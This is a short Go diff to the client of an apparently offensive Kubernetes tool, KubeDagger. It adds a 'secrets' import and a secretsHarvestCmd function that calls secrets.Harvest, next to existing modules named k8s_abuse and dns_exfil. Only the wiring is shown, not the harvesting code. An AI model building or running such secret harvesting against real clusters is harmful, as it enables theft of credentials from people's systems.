@@ -26,6 +26,7 @@ import (
 
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_meta"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_abuse"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/secrets"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dashboard"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dns_exfil"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/docker"
@@ -220,6 +221,11 @@ func cloudMetaCmd(cmd *cobra.Command, args []string) error {
 func k8sAbuseCmd(cmd *cobra.Command, args []string) error {
 	logrus.SetLevel(options.LogLevel)
 	return k8s_abuse.Execute(options.K8sAction, options.K8sToken, options.K8sNamespace, options.Output)
+}
+
+func secretsHarvestCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return secrets.Harvest(options.SecretSources, options.Output)
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
